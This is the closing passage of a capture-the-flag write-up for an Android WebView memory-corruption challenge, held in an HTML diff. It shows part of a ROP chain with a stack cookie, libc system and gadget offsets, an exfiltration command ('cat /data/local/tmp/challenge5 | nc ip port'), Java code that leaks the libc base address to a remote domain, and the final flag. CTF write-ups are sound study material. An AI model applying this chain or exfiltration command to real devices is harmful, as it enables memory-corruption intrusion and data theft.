+        <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>
+        <span class="token operator">...</span>
+        cookie<span class="token punctuation">,</span>                                            <span class="token comment">// @ offset 0x208</span>
+        systemFunctionAddress<span class="token punctuation">,</span>
+        <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>    <span class="token comment">// don't care about rsi</span>
+        getMySomethingValue<span class="token punctuation">,</span>                               <span class="token comment">// rdi</span>
+        ropGadgetAddress
+    <span class="token punctuation">]</span>
+</code></pre>
+<p>Where finally:</p>
+<ul>
+<li>cookie holds our stack cookie value;</li>
+<li>systemFunctionAddress is the pointer to <strong>libc system</strong> function (libc base address + 0x7d360);</li>
+<li>getMySomethingValue is the pointer to the first argument passed to <strong>system</strong> function (in our case <em>cat /data/local/tmp/challenge5 | nc ip port</em>);</li>
+<li>ropGadgetAddress is the pointer to our rop gadged (base libc address + 0xc217e).</li>
+</ul>
+<h2 id="when-language-does-not-assist-you">When language does not assist you</h2>
+<p>We’re almost done. Every <strong>libc</strong> function address (in-memory address, not the relative one) can be obtained by adding the relative function address to the value passed as search component from our Java app to our webpage.</p>
+<p>In case you forgot it:</p>
+<pre class=" language-java"><code class="prism  language-java">    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+    <span class="token punctuation">.</span><span class="token function">putExtra</span><span class="token punctuation">(</span><span class="token string">"url"</span><span class="token punctuation">,</span> String<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span>
+        <span class="token string">"https://mydomain.tld/?%d"</span><span class="token punctuation">,</span> <span class="token comment">// &lt;---- %d</span>
+         <span class="token function">getLibraryBaseAddress</span><span class="token punctuation">(</span><span class="token string">"/system/lib64/libc.so"</span>
+       <span class="token punctuation">)</span>
+     <span class="token punctuation">)</span><span class="token punctuation">;</span>
+     <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+</code></pre>
+<p>Probably the big issue for this challenge was the lack of 64bit integer support in javascript. I had to type more code to handle them than the code to exploit the bug.</p>
+<p><a href="https://github.com/luc10/h1-702-2018-ctf-wu/challenge-5/">Here</a> you can find the whole source of the exploit.</p>
+<h2 id="summing-up-1">Summing up</h2>
+<p>There’s a lot to say but I bet everyone who played the Android challenge had so much fun. I must thank Christopher Thompson and the whole H1 team for giving me an opportunity to take a break from university and exams with this awesome CTF challenge. No matter what, I hope to jump into another one soon. Time to rest (study) now! 💤</p>
+<p>Uh, I almost forgot… The last flag is:</p>
+<p><code>flag{in_uR_w33b_view_4nd_ur_mem}</code></p>
+</div>
+</body>
+
+</html>
